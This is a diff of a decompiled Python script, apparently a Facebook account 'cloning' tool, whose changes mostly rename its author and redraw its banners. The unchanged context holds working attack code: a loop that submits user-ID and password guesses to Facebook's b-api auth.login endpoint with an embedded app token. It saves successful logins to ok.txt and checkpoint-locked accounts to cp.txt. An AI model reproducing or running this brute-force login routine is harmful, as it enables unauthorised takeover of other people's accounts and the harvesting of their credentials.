@@ -1,4 +1,4 @@
-# Decompile by AbdulMateen (Tools By MetooHacker)
+# Decompile by Mateen (Tools By Abdul-Mateen)
 # Time Succes decompile : 2022-03-15 19:41:54.557141
 import os
 try:
@@ -31,9 +31,9 @@ class Main:
 		os.system('xdg-open https://m.facebook.com/MUB4SH4R')
 		print(" ")
 		print(" ")
-		print("    \033[0;97m ###Metoo###  ###  Hacker   ###\n     ##     ## Best  #   ## ##\n     \033[0;91m##     ## ##    Tool#  ##   ##\n     \033[0;91m#####2009###  ####Clone####  ##     ##\n     \033[0;97m##     ## ##     ########\n     \033[0;97m##     ##     ## ##     ##\n     \033[0;97m######  #####  ##     ##")
+		print("    \033[0;98m ########  ########     ###\n     ##     ## ##     ##   ## ##\n     \033[0;91m##     ## ##     ##  ##   ##\n     \033[0;91m########  ########  ##     ##\n     \033[0;97m##     ## ##     ## #########\n     \033[0;97m##     ## ##     ## ##     ##\n     \033[0;97m########  ########  ##     ##")
 		print("    \033[0;92m-------------------------------")
-		print("    \033[0;92mAuthur   :  AbdulMateen") 
+		print("    \033[0;92mAuthur   :  Abdul Mateen") 
 		print("    \033[0;92mfacebok  :  AbdulMateen") 
 		print("    \033[0;92mWhtsap   :  +92300000000") 
 		print("    \033[0;92m-------------------------------")
@@ -95,12 +95,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r  \033[0;91m   [METOO_OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;91m   [Metoo_OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;92m   [METOO_CP] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m   [Metoo_CP] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
@@ -111,8 +111,15 @@ class Main:
 
 if len(sys.argv) == 2:
 	if sys.argv[1] == "--info":
-		print("   _________________        \n  /  ___/\_   ___/        \n /   \  __ |    __)          \n \    \  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \__  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/____/")
-		print("\n [*] Author    :  "
+		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")
+		print("\n [*] Author    :  ")
+		print(" [*] Team      :  \n")
+		print(" [ Sosial Medi  ] \n")
+		print(" [*] Facebook  : https://facebook.com/ ")
+		print(" [*] Instagram : https://instagram.com/ ")
+		print(" [*] YouTube   : https://youtube.com/ ")
+		exit(" [*] GitHub    : https://github.com/ ")
+	else:
 		Main()
 
 try:Main()
